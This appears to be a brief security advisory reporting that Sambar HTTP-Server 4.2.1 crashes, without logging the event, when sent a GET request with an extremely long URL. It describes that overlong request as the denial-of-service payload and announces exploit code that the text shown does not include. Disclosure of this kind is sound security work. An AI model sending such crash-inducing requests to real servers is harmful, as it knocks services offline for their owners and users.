While testing the security of the Sambar HTTP-Server I found it vulnerable
to a simple DOS attack. Sending a "GET XXXX(...a lot of Xs..)XXXX HTTP/1.0"
crashes the Server. It will die WITHOUT logging the attack.

My testing-environment:

Sambar 4.2.1
M$IE 5.0 (de)
Windows 95 C (de)

Sample exploit code follows.
